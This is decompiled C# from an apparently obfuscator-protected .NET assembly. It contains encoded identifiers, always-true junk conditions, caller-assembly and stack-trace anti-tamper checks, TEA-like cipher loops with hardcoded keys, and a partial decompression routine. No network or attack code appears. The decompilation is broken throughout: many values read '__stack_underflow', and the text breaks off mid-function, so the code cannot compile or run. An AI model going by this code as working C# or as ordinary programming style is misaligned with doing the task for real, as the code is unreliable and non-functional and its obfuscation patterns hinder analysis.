// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__4()
{
    #=qd92UVUgmlXoQZdJDkVvBpfqQ5IrxjaeWORyWFC422PQ=();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__5(object arg1)
{
    _Lambda$__6.Invoke();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void _Lambda$__6()
{
    #=qORcQ89THKgijJ1sWRyjf4hLd1g4H_sosI9t_gkVfZ7g=();
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qBeOBlH6CwHFnQdZWWBgZ_pemudZ6CfCVcfOQtgpeG$Y=(#=qxe_BfLLMHqYa_KBeLsRfpw== arg1)
{
    switch ((&arg1).#=qKi0KrAcAGUOMcS5S$2tJyg==)
    {
        case 0:
            #=q5v5cLSMFBaxiTtOEjscx86gN2ozXlfytiL6UmXnyWtg=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 1:
            #=q_XA5h2lVGHLcY9dK754wKGrOjAm6aBbwPxcUJXgJThJUz83kMbCL53G5uuOLP6Rq((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 2:
            #=qIFfr$DrKqIieRc688$vylAlBsEnx9Z3$TxvrDsPURfM=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 3:
            #=qejgvNXJQvgM2GomZsygLjreyguSPQ29pQHqjR_a0dWk=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 4:
            #=qCGokdf0OOxeMJLDkXSfc3NPmwygIQ29RjKQWj$wbNGB9C1pPgma_891QiNyTRXcA((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 5:
            #=qDqyUVyJLXCtYqhZ0$opqkomqhUBn2WCeEEvGAXlNQ$I=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        default:
            break;
    }
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=q5v5cLSMFBaxiTtOEjscx86gN2ozXlfytiL6UmXnyWtg=(object[] arg1)
{
    string local0;
    System.Guid local1;

    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    #=qdImPAY1o3YhbLtukwCQ91cISaeIEWRKSYrGZ3dTVnkY=(local1, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=q_XA5h2lVGHLcY9dK754wKGrOjAm6aBbwPxcUJXgJThJUz83kMbCL53G5uuOLP6Rq(object[] arg1)
{
    string local0;
    string local1;
    long local2;
    System.Guid local3;

    if (3 != 0)
    {
        local3 = __stack_underflow;
    }
    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    if (8 != 0)
    {
        local2 = __stack_underflow;
    }
    local0 = (String)arg1[3];
    #=qza7O1AHrroJC7yRIJz4wINR_Sgo4hDpQrj_OYfIrlJE=(local3, local1, local2, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qIFfr$DrKqIieRc688$vylAlBsEnx9Z3$TxvrDsPURfM=(object[] arg1)
{
    string local0;
    long local1;
    string local2;
    long local3;
    System.Guid local4;

    if (4 != 0)
    {
        local4 = __stack_underflow;
    }
    if (0 == 0)
    {
        local2 = __stack_underflow;
    }
    if (4 != 0)
    {
        local3 = __stack_underflow;
    }
    local1 = *arg1[3];
    local0 = (String)arg1[4];
    #=q6Ct3QmvVLFC7my$dL1uEiHGmXJ5qCuK4WIhDwfhPTFs=(local4, local2, local3, local1, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qejgvNXJQvgM2GomZsygLjreyguSPQ29pQHqjR_a0dWk=(object[] arg1)
{
    long local0;
    string local1;
    System.Guid local2;

    if (-1 != 0)
    {
        local2 = __stack_underflow;
    }
    if (8 != 0)
    {
        local1 = __stack_underflow;
    }
    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    #=qvz1sVA0ePAgs1nzIHQTFVtjljpeJ1QO1S19vLxn8DMU=(local2, local1, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qCGokdf0OOxeMJLDkXSfc3NPmwygIQ29RjKQWj$wbNGB9C1pPgma_891QiNyTRXcA(object[] arg1)
{
    byte[] local0;
    long local1;
    string local2;
    System.Guid local3;

    if (-1 != 0)
    {
        local3 = __stack_underflow;
    }
    if (4 != 0)
    {
        local2 = __stack_underflow;
    }
    if (6 != 0)
    {
        local1 = __stack_underflow;
    }
    local0 = (byte[])arg1[3];
    #=qWNtQAckY3EoQ$HeRpEQ9MEcj4oiFXpw6QZThgsGNZIA=(local3, local2, local1, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qDqyUVyJLXCtYqhZ0$opqkomqhUBn2WCeEEvGAXlNQ$I=(object[] arg1)
{
    long local0;
    string local1;
    System.Guid local2;
    int local3;

    if (6 != 0)
    {
        local2 = __stack_underflow;
    }
    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    local3 = *arg1[3];
    #=qTfMnD_jfiITiB95ES2nWdLlDTdGOSDVgXEnjKNGkWcM=(local2, local1, local0, local3);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qdImPAY1o3YhbLtukwCQ91cISaeIEWRKSYrGZ3dTVnkY=(System.Guid arg1, string arg2)
{
    #=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc= local0;
    object[] local1;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (1 != 0)
    {
        local1 = __stack_underflow;
    }
    local1[0] = arg1;
    local1[1] = (&local0).#=q0pfW5T3uO1I6LyXSPFW7Qw==;
    local1[2] = (&local0).#=qWFUoT0l6elO8yn$hIYUL6Q==;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local1);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qza7O1AHrroJC7yRIJz4wINR_Sgo4hDpQrj_OYfIrlJE=(System.Guid arg1, string arg2, long arg3, string arg4)
{
    bool local0;
    object[] local1;

    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    local1[0] = arg1;
    local1[1] = local0;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local1);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=q6Ct3QmvVLFC7my$dL1uEiHGmXJ5qCuK4WIhDwfhPTFs=(System.Guid arg1, string arg2, long arg3, long arg4, string arg5)
{
    bool local0;
    object[] local1;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    local1[0] = arg1;
    local1[1] = local0;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local1);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qvz1sVA0ePAgs1nzIHQTFVtjljpeJ1QO1S19vLxn8DMU=(System.Guid arg1, string arg2, long arg3)
{
    string local0;
    object[] local1;

    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    local1[0] = arg1;
    local1[1] = local0;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local1);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qWNtQAckY3EoQ$HeRpEQ9MEcj4oiFXpw6QZThgsGNZIA=(System.Guid arg1, string arg2, long arg3, byte[] arg4)
{
    object[] local0;

    #=qkbMW3ViV2G4xkJU4KS4XYUwKzC$oNmhjZ49L9c8BrOM=(arg2, arg4, arg3);
    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = arg1;
    local0[1] = checked((int)arg4.Length);
    #=qABSlSWKh$8sT$UF4sG_vQMmKqh5lDRXHlL1yCp0W8x0=(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local0);
    return;
}
// #=qJT4I5hOweIk$xYFEeDszbikglXCuquUd$v9AXtyq2ns=
public static void #=qTfMnD_jfiITiB95ES2nWdLlDTdGOSDVgXEnjKNGkWcM=(System.Guid arg1, string arg2, long arg3, int arg4)
{
    byte[] local0;
    object[] local1;

    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (1 != 0)
    {
        local1 = __stack_underflow;
    }
    local1[0] = arg1;
    local1[1] = local0;
    #=qABSlSWKh$8sT$UF4sG_vQMmKqh5lDRXHlL1yCp0W8x0=(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local1);
    return;
}
// #=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=
private static void .cctor()
{
    if (3 != 0)
    {
        #=q5uvtKo7rLfT5wGY5TBS4ixmbpGEL_B71rwbORlBpBKA= = __stack_underflow;
    }
    return;
}
// #=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=
internal static long #=q63A3zH9hQ$3c53x2wqU0Qg==()
{
    long local0;
    System.Reflection.Assembly local1;
    System.Collections.Generic.List<byte> local2;
    System.Reflection.AssemblyName local3;
    byte[] local4;
    int local5;
    int local6;
    int local7;
    ulong local8;
    int local9;
    long local10;
    #=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc= local11;

    if (System.Reflection.Assembly.GetCallingAssembly() != typeof(#=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=).Assembly || !(#=q0xixHwSTS$a9x5dtNZccvebVLuO4euYOepae9m2S64s=()))
    {
        return 5038234971328056794L;
    }
    System.Threading.Monitor.Enter((3 != 0 ? (local11 = #=q5uvtKo7rLfT5wGY5TBS4ixmbpGEL_B71rwbORlBpBKA=) : #=q5uvtKo7rLfT5wGY5TBS4ixmbpGEL_B71rwbORlBpBKA=));
    try
    {
        if (7 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local10;
}
// #=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=
private static bool #=q0xixHwSTS$a9x5dtNZccvebVLuO4euYOepae9m2S64s=()
{
    if (!(#=q4o4zrrzr7uOw3pySDBOwZtAOdlhvudqcbIbhABkQfe4=()))
    {
        return false;
    }
    return true;
}
// #=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=
private static bool #=q4o4zrrzr7uOw3pySDBOwZtAOdlhvudqcbIbhABkQfe4=()
{
    System.Diagnostics.StackTrace local0;
    System.Diagnostics.StackFrame local1;
    System.Reflection.MethodBase local2;
    System.Type local3;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    if (local1 == null)
    {
    }
    if (7 != 0)
    {
        local2 = __stack_underflow;
    }
    if (local2 == null)
    {
    }
    local3 = __stack_underflow;
    if (local3 == typeof(RuntimeMethodHandle))
    {
        return false;
    }
    if (local3 == null)
    {
        return false;
    }
    if (local3.Assembly != typeof(#=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=).Assembly)
    {
        return false;
    }
    return true;
}
// #=qkFwCVmJ2HhZ6r$uKeVZFFfVLdddj$WEInl9bSgbErDM=
private static int #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(System.Type arg1)
{
    return ((-1 != 0 ? arg1 : arg1)).MetadataToken;
}
// #=qAp_zHqT7acjq$QNiBoq2EA==
public void .ctor()
{
    ((6 != 0 ? this : this)).ctor();
    return;
}
// #=qAp_zHqT7acjq$QNiBoq2EA==
internal static int #=qAk5SEnvr6iWKzWTaOapTEA_BFwuNkz68xuZLTnuQOh4=()
{
    return #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qAp_zHqT7acjq$QNiBoq2EA==)), #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOR7qPTYp9qHTyadzUKgUYg==)), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOxeV7mwtJT4AH3HtBqNUXw==))), #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qedcCJsW_6aMZb5lO3tR01A==)) ^ (-(~(-(~(~(-(-(~(-(~(~-30560524))))))))))), #=qWbDVCvJRlY$nWsVAToK13K8LD9gZFcJQAtBUvjDEcyo=())));
}
// #=qedcCJsW_6aMZb5lO3tR01A==
public void .ctor()
{
    ((1 != 0 ? this : this)).ctor();
    return;
}
// #=qedcCJsW_6aMZb5lO3tR01A==
internal static int #=qAk5SEnvr6iWKzWTaOapTEA_BFwuNkz68xuZLTnuQOh4=()
{
    return #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qWLKNBubktRcyu8vI4dIAJNOqajvyL7NccmUEC4QD9y8=() ^ (-(~(~(-(~(-(~(-(~-527758449))))))))), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qwGMLoIBYlotM6E$y2KTAuQ==))), #=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOxeV7mwtJT4AH3HtBqNUXw==)) ^ #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qAp_zHqT7acjq$QNiBoq2EA==)), -(~(~(-(~(-(~(-(~-365557632))))))))));
}
// #=qGS6wNk5u54YEpqtjtMFIpQ==
public void .ctor()
{
    ((2 != 0 ? this : this)).ctor();
    return;
}
// #=qGS6wNk5u54YEpqtjtMFIpQ==
internal static int #=qWLKNBubktRcyu8vI4dIAJNOqajvyL7NccmUEC4QD9y8=()
{
    return #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qedcCJsW_6aMZb5lO3tR01A==)), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qwGMLoIBYlotM6E$y2KTAuQ==)) ^ #=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qGS6wNk5u54YEpqtjtMFIpQ==)), #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qAp_zHqT7acjq$QNiBoq2EA==)), #=qqMkZyGiL$PHkYblZrq1S69029tlEdPXkxbM_smmrcRU=())));
}
// #=qM_mpCWjOCBlruGH_QcTQHocD7LUJCLuKe8ntf2VtQlk=
internal static int #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(int arg1, int arg2)
{
    return ((2 != 0 ? arg1 : arg1)) ^ (((8 != 0 ? arg2 : arg2)) - (-(~(-(~(~(-(-(~(~1406785610))))))))));
}
// #=qM_mpCWjOCBlruGH_QcTQHocD7LUJCLuKe8ntf2VtQlk=
internal static int #=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(int arg1, int arg2)
{
    return (((1 != 0 ? arg1 : arg1)) - (~(-(-(~(~(-(~(-(~1320418445)))))))))) ^ (((6 != 0 ? arg2 : arg2)) + (-(~(-(~(~(-(-(~(~-1040853009))))))))));
}
// #=qM_mpCWjOCBlruGH_QcTQHocD7LUJCLuKe8ntf2VtQlk=
internal static int #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(int arg1, int arg2)
{
    return ((3 != 0 ? arg1 : arg1)) ^ ((((1 != 0 ? arg2 : arg2)) - (-(~(-(~(-(~(~(-(~-1570757118)))))))))) ^ (((4 != 0 ? arg1 : arg1)) - arg2));
}
// #=qOR7qPTYp9qHTyadzUKgUYg==
public void .ctor()
{
    ((2 != 0 ? this : this)).ctor();
    return;
}
// #=qOR7qPTYp9qHTyadzUKgUYg==
internal static int #=qWbDVCvJRlY$nWsVAToK13K8LD9gZFcJQAtBUvjDEcyo=()
{
    return #=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qAk5SEnvr6iWKzWTaOapTEA_BFwuNkz68xuZLTnuQOh4=(), #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOR7qPTYp9qHTyadzUKgUYg==)), #=qWLKNBubktRcyu8vI4dIAJNOqajvyL7NccmUEC4QD9y8=())), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qAp_zHqT7acjq$QNiBoq2EA==)));
}
// #=qOxeV7mwtJT4AH3HtBqNUXw==
public void .ctor()
{
    ((7 != 0 ? this : this)).ctor();
    return;
}
// #=qOxeV7mwtJT4AH3HtBqNUXw==
internal static int #=qgN8fDYnB$J$X9QGGYQsYuvA6BpDT4GE_ca7JiOh661Q=()
{
    return #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qGS6wNk5u54YEpqtjtMFIpQ==)), #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOxeV7mwtJT4AH3HtBqNUXw==)), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOR7qPTYp9qHTyadzUKgUYg==)))), #=qAk5SEnvr6iWKzWTaOapTEA_BFwuNkz68xuZLTnuQOh4=());
}
// #=qwGMLoIBYlotM6E$y2KTAuQ==
public void .ctor()
{
    ((0 == 0 ? this : this)).ctor();
    return;
}
// #=qwGMLoIBYlotM6E$y2KTAuQ==
internal static int #=qqMkZyGiL$PHkYblZrq1S69029tlEdPXkxbM_smmrcRU=()
{
    return #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qwGMLoIBYlotM6E$y2KTAuQ==)), #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOxeV7mwtJT4AH3HtBqNUXw==)), #=qvRKdouixzy3mopZ1VtjZRIxbtiSW2GAGLD$37iVLn9U=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qGS6wNk5u54YEpqtjtMFIpQ==)), #=qwdHHpd7UWv1_2lcOeunA18XKUsrG9D8S$xli$tkAMlI=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qedcCJsW_6aMZb5lO3tR01A==)), #=qfOXLv$ej4ffVoa9QN8Vke8O9DCKhSHEsi_sqFk8Qf0o=(#=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qOR7qPTYp9qHTyadzUKgUYg==)), #=qIKJSaaKraxRzi3AD57FKg9MQkSdmOqUcHNxKjSZFGkg=(typeof(#=qAp_zHqT7acjq$QNiBoq2EA==)))))));
}
// #=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc=
internal void .ctor()
{
    ((-1 != 0 ? this : this)).ctor();
    ((6 != 0 ? this : this)).#=qtBt$1AtaHrrce6fc6LOT3axuBNxZ$SQPty78qYGi1os=(unchecked((long)0));
    return;
}
// #=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc=
internal long #=qWaMf_MISHPEu34of2Bm5$ay6Z6PuaGN7w1jlKYjzwdE=()
{
    int[] local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;
    int local6;
    ulong local7;

    if (System.Reflection.Assembly.GetCallingAssembly() != typeof(#=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc=).Assembly)
    {
        return unchecked((long)2918384);
    }
    if (!(#=q0xixHwSTS$a9x5dtNZccvebVLuO4euYOepae9m2S64s=()))
    {
        return unchecked((long)2918384);
    }
    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[3] = ~(-(-(~(-(~(~(-(~(-(~-1945488950))))))))));
    local0[1] = -(~(~(-(-(~(-(~(~1641090042))))))));
    local0[2] = -(~(-(~(-(~(~(-(~860348198))))))));
    local0[0] = ~(-(-(~(~(-(-(~(~(-(~-1249369805))))))))));
    if (8 != 0)
    {
        local1 = __stack_underflow;
    }
    if (6 != 0)
    {
        local2 = __stack_underflow;
    }
    if (2 != 0)
    {
        local3 = __stack_underflow;
    }
    if (0 == 0)
    {
        local4 = __stack_underflow;
    }
    local5 = 0;
    while (local5 != 32)
    {
        local2 = local2 - ((((local1 << 4) ^ (local1 >> 5)) + local1) ^ (local4 + local0[(local4 >> 11) & 3]));
        local4 = local4 - local3;
        local1 = local1 - ((((local2 << 4) ^ (local2 >> 5)) + local2) ^ (local4 + local0[local4 & 3]));
        local5 = local5 + 1;
        continue;
    }
    local6 = 0;
    while (local6 != 4)
    {
        local0[local6] = 0;
        local6 = local6 + 1;
        continue;
    }
    local7 = ((long)local2) << 32;
    local7 = local7 | ((ulong)local1);
    return local7;
}
// #=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc=
internal void #=qtBt$1AtaHrrce6fc6LOT3axuBNxZ$SQPty78qYGi1os=(long arg1)
{
    int[] local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;
    int local6;

    if (System.Reflection.Assembly.GetCallingAssembly() != typeof(#=qY9NY2gigPsj8X4CYx0UCT2vGlqkgsq6GuC2fWqP3Voc=).Assembly)
    {
        return;
    }
    if (!(#=q0xixHwSTS$a9x5dtNZccvebVLuO4euYOepae9m2S64s=()))
    {
        return;
    }
    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[1] = -(~(~(-(-(~(-(~(~(-(~1641090041))))))))));
    local0[0] = -(~(~(-(-(~(-(~(~-1249369802))))))));
    local0[2] = -(~(-(~(-(~(~(-(~860348198))))))));
    local0[3] = -(~(~(-(~(-(~(-(~-1945488951))))))));
    if (5 != 0)
    {
        local1 = __stack_underflow;
    }
    if (6 != 0)
    {
        local2 = __stack_underflow;
    }
    if (7 != 0)
    {
        local3 = __stack_underflow;
    }
    if (2 != 0)
    {
        local4 = __stack_underflow;
    }
    local5 = 0;
    while (local5 != 32)
    {
        local2 = local2 + ((((local3 << 4) ^ (local3 >> 5)) + local3) ^ (local4 + local0[local4 & 3]));
        local4 = local4 + local1;
        local3 = local3 + ((((local2 << 4) ^ (local2 >> 5)) + local2) ^ (local4 + local0[(local4 >> 11) & 3]));
        local5 = local5 + 1;
        continue;
    }
    local6 = 0;
    while (local6 != 4)
    {
        local0[local6] = 0;
        local6 = local6 + 1;
        continue;
    }
    this.#=qxWp4ETQRrgcfPChnmxhivyMmb5p6MuyluC9Tc_Mhkec= = local2;
    this.#=qeMVJwq86lZc4hsNJNMQJVYiQqG94mfqhBGc9gH9UUgM= = local3;
    return;
}
// #=qmLTtz8OEDrkzFTzYkI_Dg1dvKwiGw9blNcZSU_QqMsg=
public void .ctor(#=qbOmsEb0zGpdZukI0D4Idug== arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=qbUu2Y2P9FL2iRkWyb62gww== = __stack_underflow;
    }
    return;
}
// #=qmLTtz8OEDrkzFTzYkI_Dg1dvKwiGw9blNcZSU_QqMsg=
public void LogClientException(System.Exception arg1, string arg2)
{
    #=qhg8oaKg1xx$HC$DKnlbXQpibwH2HXqMGSlGv30vEUsU=(((8 != 0 ? this : this)).#=qbUu2Y2P9FL2iRkWyb62gww==, (5 != 0 ? arg1 : arg1), (4 != 0 ? arg2 : arg2));
    return;
}
// #=qmLTtz8OEDrkzFTzYkI_Dg1dvKwiGw9blNcZSU_QqMsg=
public void LogClientMessage(string arg1)
{
    #=q5j3wvJXlnrGmRnKUHr_1SQ==((2 != 0 ? arg1 : arg1));
    return;
}
// #=qnB6QgyVNIUL$Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE=
private static void .cctor()
{
    int local0;
    System.Diagnostics.StackTrace local1;
    System.Diagnostics.StackFrame local2;
    int local3;
    System.Reflection.MethodBase local4;
    System.Type local5;

    if (5 != 0)
    {
        #=qUZMwlqlTBPLi1iscPEnOdMZqp5jDsQ1UK2Kgux$Yn40= = __stack_underflow;
    }
    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    if (1 != 0)
    {
        local1 = __stack_underflow;
    }
    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    local2 = local1.GetFrame(local0);
    local3 = (-(~(~(-(-(~(-(~(-(~(~774876386))))))))))) ^ (-(~(-(~(-(~(~(-(~(-(~-314203620)))))))))));
    if (local2 == null)
    {
    }
    local4 = __stack_underflow;
    if (local2 != null)
    {
        local3 = local3 ^ (~(-(~(-(-(~(~(-(~-314179587)))))))));
    }
    local5 = (local4 == null ? null : local4.DeclaringType);
    if (local5 != typeof(RuntimeMethodHandle))
    {
        if (local5 != null)
        {
            if (local5.Assembly == typeof(#=qnB6QgyVNIUL$Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE=).Assembly)
            {
                local3 = local3 ^ ((-(~(~(-(~(-(-(~(-(~(~-24036))))))))))) - local0);
                #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= = #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= | 16;
            }
            else
            {
                local3 = local3 ^ 724202217;
                #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= = #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= | 2;
            }
        }
        else
        {
            local3 = local3 ^ (~(-(-(~(-(~(~(-(-(~(~-37046)))))))))));
            #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= = #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= | 1;
        }
    }
    else
    {
        local3 = local3 ^ (807 + local0);
        #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= = #=q5XjI6hZlPIrXq2h2btB_pVJgDh_o3RXkWrFCxLCG1E0= | 4;
    }
    #=qVHGoZQC06Wdz1fJDKkoeiKu9aci51znqNtMz8dGZQMQ= = #=qVHGoZQC06Wdz1fJDKkoeiKu9aci51znqNtMz8dGZQMQ= + local3;
    return;
}
// #=qnB6QgyVNIUL$Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE=
private static void #=qiGEsYAsOSz$jy0hyBv5MGPdLIlePpwWMgCE_Abe_mLY=(byte[] arg1, int arg2, byte[] arg3)
{
    int local0;
    int local1;
    int local2;
    int local3;
    int local4;
    int local5;
    int local6;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    local3 = (int)arg3.Length;
    while (true)
    {
        if (local0 < local3)
        {
            local2 = local2 << 1;
            if ((local2 << 1) == 256)
            {
                local2 = 1;
                arg2 = arg2 + 1;
                local1 = arg1[arg2];
            }
            if ((local1 & local2) == 0)
            {
                local0 = local0 + 1;
                arg2 = arg2 + 1;
                arg3[local0] = arg1[arg2];
                continue;
            }
            else
            {
                local4 = (arg1[arg2] >> 2) + 3;
                local5 = ((arg1[arg2] << 8) | arg1[arg2 + 1]) & 1023;
